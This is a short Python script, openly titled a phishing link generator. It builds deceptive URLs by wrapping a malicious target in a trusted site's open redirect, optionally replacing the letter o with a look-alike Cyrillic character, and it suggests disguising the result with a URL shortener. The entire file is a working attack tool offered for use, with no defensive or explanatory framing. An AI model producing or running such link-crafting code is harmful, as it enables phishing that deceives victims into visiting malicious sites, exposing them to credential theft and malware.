import argparse
from urllib.parse import quote

parser = argparse.ArgumentParser(description="Phishing Link Generator")
parser.add_argument("--redirect", required=True, help="Open redirect base")
parser.add_argument("--target", required=True, help="Malicious target URL")
parser.add_argument("--homoglyph", action="store_true", help="Use Cyrillic o")

args = parser.parse_args()

target = args.target.replace("o", "о") if args.homoglyph else args.target
encoded = quote(target, safe="")
final = f"{args.redirect}?url={encoded}"

print(f"[+] Phishing Link:\n{final}")
print("[+] Shortened suggestion: bit.ly or tinyurl disguise")
